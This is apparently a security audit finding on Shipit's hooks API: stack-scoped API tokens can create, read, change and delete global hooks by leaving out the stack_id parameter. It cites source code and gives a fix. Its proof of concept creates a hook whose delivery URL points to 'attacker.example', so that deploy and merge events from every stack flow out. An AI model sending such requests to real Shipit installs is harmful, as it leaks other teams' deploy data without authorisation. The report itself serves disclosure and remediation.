## Title
API clients with `write:hook`/`read:hook` permission but no `stack` binding can create, read, update and destroy **global** hooks that fire for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

## Summary
`Api::HooksController` gates hook management with a scope-only permission check (`write:hook` / `read:hook`) that never verifies which stack (if any) the acting `ApiClient` is authorized for. Because `Hook.stack_id` is nilable and a missing `stack_id` param means "global hook," any API client whose token merely carries the `write:hook`/`read:hook` permission — even one that is also `stack`-scoped to a single stack via `ApiClient#stack_id` — can manage hooks that are global (`stack_id: nil` — delivered for *every* stack's events), not just the stack it is nominally restricted to. This is the same class of bug as the Palmera report: the enforced check (`operation:scope` permission) is weaker than the binding the system's design implies (the token's authorized stack vs. the resource actually mutated).

## Finding Description
`Api::BaseController` scopes stacks a client can touch through `current_api_client.stack_id`: [1](#0-0) 

But `HooksController` computes the target collection independently, keyed only on whether `params[:stack_id]` was supplied — not on `current_api_client.stack_id`: [2](#0-1) 

`stack_id` (line 50-52) returns `nil` unless the caller explicitly passes a `stack_id` param, and `hooks` (line 46-48) then resolves to `Hook.where(stack_id: nil)` — the **global** hooks, which `Hook.emit`/`Hook.deliver` fan out to for every stack's events (`for_stack` = `where(stack_id: [nil, stack_id])`): [3](#0-2) 

The access control actually enforced is `require_permission :write, :hook` / `:read, :hook` — a scope check on the *type* of resource, unconditional on the specific stack the client is bound to: [4](#0-3) [5](#0-4) 

The equality that should hold is: **stack a token authorises == stack the hook resource is scoped to**. It does not hold here: an `ApiClient` created with `stack: some_stack` (limiting it, per intent, to that one stack) plus `write:hook`/`read:hook` permissions is never checked against `some_stack` when the `stack_id` param is simply omitted; the controller instead falls into the "global hooks" branch and lets that stack-scoped token manage delivery URLs, secrets, and event subscriptions for hooks that fire on **every** stack in the Shipit instance.

## Impact Explanation
A hook's `delivery_url` is an attacker/operator controllable HTTP(S) endpoint; global hooks receive `stack`, `deploy`, `rollback`, `merge`, `pull_request`, `commit_status` and other events for the entire Shipit instance, including payloads about repositories/stacks the token was never meant to see. An attacker who obtains (or is issued) a stack-scoped API token carrying `write:hook`/`read:hook` can:
- Read existing global hooks' delivery URLs and content types (`GET /api/hooks`), disclosing operational and configuration data about stacks/deploys outside the token's authorized stack — an unauthenticated-for-that-scope read of stack/deploy activity across the whole install.
- Create a new global hook pointing at an attacker-controlled URL, causing every future deploy/rollback/merge/commit-status event for every stack to be exfiltrated to that URL.
- Update/destroy existing global hooks, disrupting the notification pipeline relied on by other stacks.

This crosses the "escalation into `Shipit.github_teams` authorization" / cross-stack data exfiltration bar described for High severity: a token scoped (by design, via `ApiClient#stack_id`) to one stack reaches state belonging to all stacks.

## Likelihood Explanation
Any deployment that issues per-stack API tokens with hook permissions (a supported and documented feature — `ApiClient#stack_id` plus `PERMISSIONS` including `read:hook`/`write:hook`) is exposed. No special privilege beyond having such a token is required; the caller simply omits the `stack_id` route param, which is the default/most natural way to call `/api/hooks`. No signature bypass or session is needed — this is a straightforward horizontal-authorization gap between two independently implemented scoping mechanisms (`current_api_client.stack_id` vs. the ad-hoc `stack_id` helper in `HooksController`).

## Recommendation
In `Api::HooksController`, resolve the target hook collection using the same `current_api_client.stack_id` binding that `BaseController#stacks`/`#stack` enforce, e.g.: if the client is stack-scoped, restrict `hooks` to `Hook.for_stack(current_api_client.stack_id)` (or reject access to global hooks entirely) instead of trusting the presence/absence of the `stack_id` request parameter. Alternatively, require a distinct permission (e.g. `write:global_hook`) for the nil-`stack_id` branch so stack-scoped tokens can never reach global hooks regardless of how the request is shaped.

## Proof of Concept
1. Create an `ApiClient` scoped to `stack_a` with permissions `['read:hook', 'write:hook']` (analogous to fixture `here_come_the_walrus`, which is scoped via `stack: shipit`).
2. Authenticate as that client and call:
   ```
   POST /api/hooks
   { "delivery_url": "https://attacker.example/collect", "events": ["deploy","stack","merge"] }
   ```
   No `stack_id` is supplied.
3. `HooksController#stack_id` returns `nil` (line 50-52), `hooks` resolves to `Hook.where(stack_id: nil)` (global hooks) rather than being rejected or scoped to `stack_a`.
4. The created hook is global; per `Hook.deliver`/`for_stack`, it now receives events for every stack in the installation, even though the client's `ApiClient#stack_id` limited it to `stack_a`.
5. `GET /api/hooks` and `PATCH/DELETE /api/hooks/:id` similarly operate on this global hook using only the `write:hook`/`read:hook` scope check, with no verification against `current_api_client.stack_id`.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L1-55)
```ruby
# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
    end
  end
end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```
